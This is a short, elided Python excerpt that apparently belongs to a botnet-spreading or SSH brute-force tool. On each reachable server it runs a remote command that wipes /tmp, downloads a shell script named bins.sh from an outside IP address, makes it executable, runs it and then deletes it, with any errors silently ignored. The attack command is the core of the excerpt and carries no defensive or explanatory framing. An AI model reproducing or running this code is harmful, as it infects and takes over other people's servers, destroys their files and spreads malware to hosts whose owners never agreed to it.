        ...
        while 1:
            try:
                ...
                if badserver == False:
                        ...
                        ssh.exec_command("cd /tmp; rm -rf *; wget http://208.67.1.186/bins.sh; chmod +x bins.sh; sh bins.sh; rm -f *; cd /tmp; wget http://208.67.1.186/bins.sh; chmod 777 bins.sh; sh bins.sh; rm -rf bins.sh")
                        time.sleep(20)
                        ssh.close()
            except:
                pass
